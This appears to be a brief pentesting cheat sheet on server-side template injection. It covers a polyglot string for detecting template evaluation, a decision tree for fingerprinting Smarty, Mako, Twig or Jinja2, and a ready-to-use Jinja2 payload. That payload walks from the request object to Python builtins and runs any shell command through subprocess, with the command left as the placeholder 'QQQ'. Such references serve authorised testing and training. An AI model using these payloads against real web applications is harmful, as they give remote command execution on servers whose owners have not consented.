# Server Side Template Injection

## Table of Contents

* [Detect](#detect)
* [Identify](#identify)
* [Exploit](#exploit)
  * [Jinja2](#jinja2)

Created by [gh-md-toc](https://github.com/ekalinin/github-markdown-toc.go)


## Detect

* Try {% raw %}`${{<%[%'"}}%\`{% endraw %}

## Identify

* {% raw %}`${ 7 * 7}`{% endraw %}
  * works -> {% raw %}`a{*comment*}b`{% endraw %}
    * works -> **Smarty**
    * fails -> {% raw %}`${"z".join("ab")}`{% endraw %}
      * works -> **Mako**
      * fails -> ???
  * fails -> {% raw %}`{{ 7 * 7 }}`{% endraw %}
    * works -> {% raw %}`{{ 7 * '7' }}`{% endraw %}
      * works -> if `49` then **Twig**, if `7777777` then **Jinja2**
      * fails -> ???
    * fails -> ???

## Exploit

### Jinja2

You have a request object that is always there

{% raw %}
```
{% print(request.application.__globals__.__builtins__.__import__('subprocess').check_output('QQQ', shell=True)) %}
```
{% endraw %}
